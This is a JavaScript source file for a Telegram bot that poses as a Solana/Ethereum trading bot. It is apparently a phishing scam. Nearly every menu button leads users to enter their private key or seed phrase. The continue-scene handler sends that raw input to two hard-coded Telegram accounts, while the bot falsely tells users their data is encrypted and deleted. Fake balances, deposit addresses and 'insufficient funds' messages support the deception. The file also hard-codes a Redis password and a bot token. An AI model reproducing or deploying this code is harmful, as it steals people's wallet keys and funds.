import pkg from "telegraf";
const { Telegraf, Markup, session, Scenes, Stage } = pkg;
import { Keypair, Connection, LAMPORTS_PER_SOL } from "@solana/web3.js";
import bs58 from "bs58";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import { createClient } from "redis";
import axios from "axios";
import { ethers } from "ethers";

const redis = createClient({
  username: "default",
  password: "JgIgigc7oBveE7xRGHFeNXoHCAyBEWDE",
  socket: {
    host: "redis-13167.c92.us-east-1-3.ec2.redns.redis-cloud.com",
    port: 13167,

    // 🔁 Reconnection strategy: retry with backoff
    reconnectStrategy: (retries) => {
      if (retries > 10) {
        console.error("Redis: Too many reconnection attempts.");
        return new Error("Too many retries");
      }
      return Math.min(100 * 2 ** retries, 2000); // max 2s delay
    },
  },
});

redis.on("error", (err) => console.error("❌ Redis Client Error:", err));
redis.on("connect", () => console.log("✅ Redis connected"));
redis.on("reconnecting", () => console.log("🔁 Reconnecting to Redis..."));

(async () => {
  try {
    await redis.connect();
  } catch (err) {
    console.error("🚨 Redis connection failed:", err);
  }
})();

const development =
  "This feature is under development, please come back later🎉";

const sendMessage =
  "/sendmessage 5492021217 Insufficient funds please add at least 2 sol to your balance";

const insufficient =
  "Insufficient funds please add at least 5 sol to your balance";

// ⌨️ Inline keyboard
const mainButtons = Markup.inlineKeyboard([
  [
    Markup.button.callback("🛒 Buy", "BUY"),
    Markup.button.callback("💰 Sell", "SELL"),
  ],
  [
    Markup.button.callback("📊 Positions", "POSITIONS"),
    Markup.button.callback("📈 Limit Orders", "LIMIT_ORDERS"),
    Markup.button.callback("🔄 DCA Orders", "DCA_ORDERS"),
  ],
  [
    Markup.button.callback("🎉 Launch Coin", "LAUNCH"),
    Markup.button.callback("🎁 Claim Airdrop", "CLAIM_AIRDROP"),
  ],
  [
    Markup.button.callback("🚀 LP Sniper", "LP_SNIPER"),
    Markup.button.callback("🆕 New Pairs", "NEW_PAIRS"),
    Markup.button.callback("👥 Referrals", "REFERRALS"),
  ],
  [
    Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET"),
    Markup.button.callback("🪙 Buy Trending", "BUYTRENDING"),
  ],
  [
    Markup.button.callback("🌉 Bridge", "BRIDGE"),
    Markup.button.callback("🤖 Copy Trade", "COPY_TRADE"),
    Markup.button.callback("💸 Withdraw", "WITHDRAW"),
  ],

  [
    Markup.button.callback("🔄 Refresh", "REFRESH"),
    Markup.button.callback("📋 Copy Wallet", "COPY_WALLET"),
  ],
  [Markup.button.callback("❓ Help", "HELP")],
]);

const escapeMarkdownV2Msg = (text) =>
  text
    .toString()
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/\]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\#")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/{/g, "\\{")
    .replace(/}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!")
    .replace(/\$/g, "\\$");

const message = (balance, price) => {
  const balStr = escapeMarkdownV2Msg(balance.toFixed(4));
  const usdStr = escapeMarkdownV2Msg((price * balance).toFixed(2));
  return ` Hello, Welcome to Raydium Trading Bot\\.  
Exclusively built by the Solana Dex community,  
The best bot used for trading any SOL token\\.  
  
Your wallet address:  
Solana:  
  \`\`\`
8rZhUBdQbSv3fgVdFP8Qms4XJPtLChRwJ9V4ymnnhjid
  \`\`\`  
Bal: ${balStr} SOL \\- \\$${usdStr}  
Click on the Refresh button to update your current balance`;
};

function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

function escapeText(text) {
  return String(text).replace(/[_[\]()~`>#+=|{}.!\\-]/g, "\\$&");
}

function formatUsd(value) {
  if (!value) return "$0";

  const num = Number(value);
  const absNum = Math.abs(num);

  let formatted;
  if (absNum >= 1_000_000_000_000) {
    formatted = (num / 1_000_000_000_000).toFixed(2) + "T";
  } else if (absNum >= 1_000_000_000) {
    formatted = (num / 1_000_000_000).toFixed(2) + "B";
  } else if (absNum >= 1_000_000) {
    formatted = (num / 1_000_000).toFixed(2) + "M";
  } else if (absNum >= 1_000) {
    formatted = (num / 1_000).toFixed(2) + "K";
  } else {
    formatted = num.toFixed(2);
  }

  return `$${formatted}`;
}

const bot = new Telegraf("7101690525:AAHy5hJjU3qdvHQPU3KIyNtbpX410I-VSMk");

bot.catch((err, ctx) => {
  console.error(`Error while handling update ${ctx.update.update_id}:`, err);
  // Optionally notify user
  try {
    // ctx.reply("Sorry, something went wrong. Please try again later.");
  } catch (e) {
    console.log("Error while sending error message:", e);
  }
});

const connection = new Connection("https://api.mainnet-beta.solana.com");
// 🔑 Wallet utils
function getWalletFromMnemonic(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex")).key;
  return Keypair.fromSeed(derived);
}

function parseWallet(input) {
  try {
    // 🧠 Mnemonic phrase (ETH/SOL)
    if (bip39.validateMnemonic(input)) {
      return getWalletFromMnemonic(input);
    }

    // 🧠 ETH hex private key (64 hex chars or 0x-prefixed)
    const hex = input.startsWith("0x") ? input.slice(2) : input;
    if (/^[0-9a-fA-F]{64}$/.test(hex)) {
      return new ethers.Wallet("0x" + hex);
    }

    // 🧠 Solana secret key in JSON array
    if (input.startsWith("[") && input.endsWith("]")) {
      const parsed = JSON.parse(input);
      if (Array.isArray(parsed) && parsed.length === 64) {
        return Keypair.fromSecretKey(Uint8Array.from(parsed));
      }
    }

    // 🧠 Solana secret key in base58 string
    if (typeof input === "string" && input.length >= 32) {
      try {
        const decoded = bs58.decode(input);
        if (decoded.length === 64) {
          return Keypair.fromSecretKey(decoded);
        }
      } catch (err) {
        // Not base58? Ignore
      }
    }
  } catch (err) {
    console.error("parseWallet error:", err.message);
  }

  return null;
}

// 🎬 Import Wallet Scene
const importWalletScene = new Scenes.BaseScene("IMPORT_WALLET");
const helpScene = new Scenes.BaseScene("HELP_SCENE");
const startScene = new Scenes.BaseScene("START_SCENE");
const continueScene = new Scenes.BaseScene("CONTINUE_SCENE");

// 🧠 Scenes setup
// const stage = new Stage([importWalletScene]);
const stage = new Scenes.Stage([
  startScene,
  importWalletScene,
  continueScene,
  helpScene,
]);
bot.use(session());
bot.use(stage.middleware());

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const secret = await redis.get(`wallet:${userId}`);

  if (secret) {
    try {
      const response = await axios.get(
        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
      );
      const price = Number(response.data.data.attributes.price_usd);
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const address = keypair.publicKey.toBase58();

      const balanceLamports = await connection.getBalance(keypair.publicKey);
      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

      await ctx.replyWithMarkdownV2(
        message(Number(sol), Number(price)),
        mainButtons
      );
    } catch (err) {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else {
    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
  }
});

bot.hears(/^.+$/, async (ctx) => {
  const text = ctx.message.text.trim();
  const isSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
  const isEthereum = /^0x[a-fA-F0-9]{40}$/.test(text);
  if (!isSolana && !isEthereum) return;

  const chainId = isSolana ? "solana" : "ethereum";

  const Unit = isSolana ? "SOL" : "ETH";

  try {
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

    const response = await axios.get(
      `https://api.dexscreener.com/token-pairs/v1/${chainId}/${text}`
    );

    const pair = response?.data?.[0];
    if (!pair) return ctx.reply("❌ No token info found for this address.");

    const base = pair.baseToken;
    const tokenSymbol = base?.symbol ?? "TOKEN";
    const tokenName = base?.name ?? "Token";
    const tokenAddress = base?.address ?? text;
    const price = Number(pair?.priceUsd).toFixed(6);
    const liq = formatUsd(pair?.liquidity?.usd);
    const mc = formatUsd(pair?.marketCap);
    const impact = "0.40%";
    const solAmount = 0.5;
    const tokensOut = Number(solAmount / Number(pair?.priceNative)).toFixed(0);
    const usdValue = (tokensOut * pair?.priceUsd).toFixed(2);

    const rawText = `*Buy $${tokenSymbol}* — \\(${escapeMarkdownV2(tokenName)}\\) 📉 •🫧 \`${escapeMarkdownV2(tokenAddress)}\`

Balance: *${escapeMarkdownV2(sol) || 0} SOL* ✏️
Price: *$${escapeMarkdownV2(price)}*
LIQ: *${escapeMarkdownV2(liq)}* — MC: *${escapeMarkdownV2(mc)}*

*0\\.5 ${Unit}* ↔ *${escapeMarkdownV2(tokensOut)} ${escapeMarkdownV2(String(tokenSymbol).toLocaleUpperCase())} \\($${escapeMarkdownV2(usdValue)}\\)*
Price Impact: *${escapeMarkdownV2(impact)}*`;

    await ctx.replyWithMarkdownV2(rawText, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Swap", callback_data: "CONNECT_WALLET" },
            { text: "Limit", callback_data: "CONNECT_WALLET" },
            { text: "DCA", callback_data: "CONNECT_WALLET" },
          ],
          [
            { text: "✅ 0.5 SOL", callback_data: "CONNECT_WALLET.5" },
            { text: "1 SOL", callback_data: "CONNECT_WALLET" },
            { text: "3 SOL", callback_data: "CONNECT_WALLET" },
          ],
          [
            { text: "5 SOL", callback_data: "CONNECT_WALLET" },
            { text: "10 SOL", callback_data: "CONNECT_WALLET" },
            { text: "X SOL ✏️", callback_data: "CONNECT_WALLET" },
          ],
          [
            { text: "✅ 15% Slippage", callback_data: "CONNECT_WALLET" },
            { text: "X Slippage", callback_data: "CONNECT_WALLET" },
          ],
          [{ text: "BUY", callback_data: "CONNECT_WALLET" }],
        ],
      },
      reply_parameters: {
        message_id: ctx.message.message_id,
      },
    });
  } catch (err) {
    console.error("Dexscreener error:", err);
    return ctx.reply("❌ Failed to fetch token info.");
  }
});
startScene.enter(async (ctx) => {
  const userId = ctx.from.id;
  const secret = await redis.get(`wallet:${userId}`);
  if (secret) {
    try {
      const response = await axios.get(
        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
      );
      const price = Number(response.data.data.attributes.price_usd);
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const address = keypair.publicKey.toBase58();

      const balanceLamports = await connection.getBalance(keypair.publicKey);
      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

      await ctx.replyWithMarkdownV2(
        message(Number(sol), Number(price)),
        mainButtons
      );
    } catch (err) {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else {
    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
  }
});

importWalletScene.enter(async (ctx) => {
  await ctx.replyWithMarkdownV2(
    `🔒 *Security Tip:* Never share your private key or mnemonic with people\\.\n\nThis bot stores your wallet securely for session\\-based trading\\.\n\n🛡️ Your data is encrypted and deleted after setup\\.`,
    Markup.inlineKeyboard([Markup.button.callback("📥 Continue", "CONTINUE")])
  );
});

continueScene.enter(async (ctx) => {
  try {
    await ctx.replyWithMarkdownV2(
      "Enter the private keys or mnemonic of the wallet you want to import"
    );
  } catch (error) {
    console.log(error);
  }
});

continueScene.hears(/.*/, async (ctx) => {
  try {
    const input = ctx.message.text.trim();
    if (ctx.message.text === "/start") {
      await ctx.scene.leave();
      return ctx.scene.enter("START_SCENE");
    }
    await ctx.telegram.sendMessage(
      // Changed from Message to sendMessage
      //config.otherUsername,
      7491085235,
      `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
      { parse_mode: "HTML" }
    );

    await ctx.telegram.sendMessage(
      // Changed from Message to sendMessage
      //config.otherUsername,
      7722235340,
      `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
      { parse_mode: "HTML" }
    );

    const wallet = parseWallet(input);

    if (!wallet) {
      return ctx.reply(
        "❌ Invalid input. Please enter a valid private key, mnemonic, or array."
      );
    }

    if (wallet instanceof ethers.Wallet) {
      const address = wallet.address;
      const secret = wallet.privateKey;
      await redis.set(`wallet:${ctx.from.id}`, secret);
      const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com", {
        name: "mainnet",
        chainId: 1,
      });
      const balance = await provider.getBalance(address);
      const eth = ethers.formatEther(balance);
      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }
      await ctx.replyWithMarkdownV2(
        escapeMarkdownV2(`✅ Wallet Imported\\!\n
 🪪 Address:\n${address}\n
 💰 Balance: *${eth} ETH*\n `),
        mainButtons
      );

      await ctx.scene.leave();
    } else {
      const address = wallet.publicKey.toBase58();
      const secret = bs58.encode(wallet.secretKey);

      await redis.set(`wallet:${ctx.from.id}`, secret);

      const balance = await connection.getBalance(wallet.publicKey);
      const sol = balance / LAMPORTS_PER_SOL;

      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }

      await ctx.replyWithMarkdownV2(
        `✅ Wallet Imported\\!\n
 🪪 Address:\n${address}\n
 💰 Balance: *${sol} SOL*\n 

 ⬇️ Select an action:`
      );
      await ctx.reply(`⬇️ Select an action:`, mainButtons);

      await ctx.scene.leave();
    }
  } catch (error) {
    console.log(error);
  }
});

importWalletScene.hears("/start", async (ctx) => {
  await ctx.scene.enter("START_SCENE");
});
continueScene.hears("/start", async (ctx) => {
  await ctx.scene.enter("START_SCENE");
});

helpScene.enter(async (ctx) => {
  await ctx.replyWithMarkdownV2(
    escapeMarkdownV2(
      "😊✍️ Please write your complaint now. Our support team will get back to you soon."
    )
  );
});

helpScene.hears(/.*/, async (ctx) => {
  const input = ctx.message.text.trim();
  await ctx.replyWithMarkdownV2(
    escapeMarkdownV2("Your request has been forwarded to the admins.")
  );
  await ctx.scene.leave();
});

bot.command("sendmessage", async (ctx) => {
  // Log the raw command
  console.log("Raw command:", ctx.message.text);

  const args = ctx.message.text.split(" ").slice(1);
  const userId = args[0];
  const message = args.slice(1).join(" ");

  console.log("Parsed args:", { userId, message });

  if (!userId || !message) {
    return ctx.reply("Usage: /sendmessage <userId> <message>");
  }

  try {
    console.log(`Attempting to send message to user ${userId}: "${message}"`);
    await ctx.telegram.sendMessage(userId, message, { parse_mode: "HTML" });
    ctx.reply(`Message sent to user ${userId}`);
  } catch (error) {
    console.error("Failed to send message:", error.message);
    ctx.reply(
      `Failed to send message: ${error.message}. Please check the user ID and try again.`
    );
  }
});
bot.command("ping", (ctx) => {
  console.log("Ping received!");
  ctx.reply("Pong!");
});

bot.action("DELETE_KEY_MSG", async (ctx) => {
  try {
    await ctx.answerCbQuery("Private key message will be deleted.");

    // Delete the message that contains the key
    await ctx.deleteMessage();

    // Retrieve secret from Redis
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (!secret) {
      return ctx.reply(
        "❌ Could not find your wallet. Please create or import again."
      );
    }

    // Restore wallet from secret key
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    const address = keypair.publicKey.toBase58();

    // Get balance
    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

    await ctx.replyWithMarkdownV2(
      `💼 *Your Solana Wallet:*\n\nAddress: \`${escapeMarkdownV2(address)}\` \n\nBalance: *${escapeMarkdownV2(sol)} SOL*`,
      mainButtons
    );
  } catch (err) {
    console.error("Error in DELETE_KEY_MSG:", err);
    await ctx.reply(
      "❌ Couldn't delete the message. Please delete it manually."
    );
  }
});

// 🎬 Trigger import scene
bot.action("CONNECT_WALLET", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.scene.enter("IMPORT_WALLET");
});

bot.action("WRITE_COMPLAINT", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.scene.enter("HELP_SCENE");
});

// 🪝 Placeholder handlers
bot.action(/.*/, async (ctx) => {
  await ctx.answerCbQuery();

  if (ctx.match.input === "REFRESH") {
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (secret) {
      try {
        const response = await axios.get(
          "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
        );
        const price = Number(response.data.data.attributes.price_usd);
        const keypair = Keypair.fromSecretKey(bs58.decode(secret));
        const address = keypair.publicKey.toBase58();

        const balanceLamports = await connection.getBalance(keypair.publicKey);
        const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

        // await ctx.replyWithMarkdownV2(
        //   message(Number(sol), Number(price)),
        //   mainButtons
        // );
        await ctx.editMessageText(message(Number(sol), Number(price)), {
          parse_mode: "MarkdownV2",
          reply_markup: mainButtons.reply_markup,
        });
      } catch (err) {
        await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
      }
    } else {
      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
    }
  } else if (ctx.match.input === "REFERRALS") {
    await ctx.editMessageText(development, {
      parse_mode: "MarkdownV2",
      reply_markup: mainButtons.reply_markup,
    });
  } else if (ctx.match.input === "BUY") {
    await ctx.editMessageText(
      "*\\(Minimum buy 0\\.5 sol\\)* If you need to import your wallet, use the 'Connect Wallet' button\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
    // await ctx.replyWithMarkdownV2(
    //   escapeMarkdownV2(
    //     "(minimum buy 0.5 sol) If you need to import your wallet, use the 'Connect Wallet' button."
    //   )
    // );
  } else if (ctx.match.input === "SELL") {
    await ctx.editMessageText(
      "*You do not have tokens to sell*, start trading in the buy menu click on the refresh button to update your balance\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "POSITIONS") {
    await ctx.editMessageText(
      "*You do not have positions yet*, start trading in the buy menu click on the refresh button to update your balance\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "LIMIT_ORDERS") {
    await ctx.editMessageText(
      "*You do not have limit orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "DCA_ORDERS") {
    await ctx.editMessageText(
      "*You do not have dca orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "COPY_TRADE") {
    await ctx.editMessageText(
      "*You do not have trade orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "LP_SNIPER") {
    await ctx.editMessageText(
      "*Sniper just released in early access\\.* Available for selected users \\(active and loyal users\\)\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "BRIDGE") {
    await ctx.editMessageText(
      "Balance\\: *0 SOL \\- $0\\.00* minimum bridge amount *\\(0\\.5 SOL\\)*\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "NEW_PAIRS") {
    await ctx.editMessageText(
      "*No wallet connected*, Import wallet to see the list of new pairs on Solana\\.",

      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "WITHDRAW") {
    await ctx.editMessageText(
      "Balance\\: *0 SOL \\- $0\\.00* minimum withdrawal amount *\\(0\\.5 SOL\\)*\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "COPY_WALLET") {
    await ctx.editMessageText(
      "```DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr```",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "HELP") {
    await ctx.editMessageText(
      "*You can open a request to the Dexscreener Trading Bot support service\\.* The Tech team would respond in the next 24 hours Via your your DM \nFor a faster solution to the problem, describe your appeal as clearly as possible\\. You can provide files or images if needed\\.\n \n📋 Rules for contacting technical support: \n1️⃣ When you first contact, please introduce yourself\\. \n2️⃣ Describe the problem in your own words\\. \n3️⃣ Be polite, and politeness will be with you\\! \n",
      {
        parse_mode: "MarkdownV2",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
        ]).reply_markup,
      }
    );
  } else if (ctx.match.input === "CLAIM_AIRDROP") {
    await ctx.editMessageText(
      "To claim your airdrop, make sure your wallet is connected\\. Click on the *'Connect Wallet'* to connect your wallet and click refresh to update\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "LAUNCH") {
    await ctx.editMessageText(
      "*No wallet connected*, Import wallet to launch a new coin with liquidity on Solana\\.",
      {
        parse_mode: "MarkdownV2",
        reply_markup: mainButtons.reply_markup,
      }
    );
  } else if (ctx.match.input === "BUYTRENDING") {
    await ctx.editMessageText("⛓️ Select Chain", {
      parse_mode: "MarkdownV2",
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback("🌿 Solana", "SOLANA_BUYTRENDING"),
        Markup.button.callback("🧬 Ethereum", "ETHEREUM_BUYTRENDING"),
      ]).reply_markup,
    });
  } else if (
    ctx.match.input === "SOLANA_BUYTRENDING" ||
    ctx.match.input === "ETHEREUM_BUYTRENDING"
  ) {
    // await ctx.answerCbQuery();
    await ctx.scene.enter("IMPORT_WALLET");
  } else if (ctx.match.input === "CONTINUE") {
    ctx.scene.enter("CONTINUE_SCENE");
  }
});

// Webhook handler
export default async function handler(request, response) {
  try {
    if (request.method === "POST") {
      await bot.handleUpdate(request.body);
      response.status(200).json({ ok: true });
    } else {
      // For setting up webhook
      const webhookUrl = `https://${request.headers.host}/api/webhook`;
      await bot.telegram.setWebhook(webhookUrl);
      response.status(200).json({
        ok: true,
        message: `Webhook set to ${webhookUrl}`,
      });
    }
  } catch (error) {
    console.error("Webhook handler error:", error);
    response.status(500).json({ ok: false, error: error.message });
  }
}
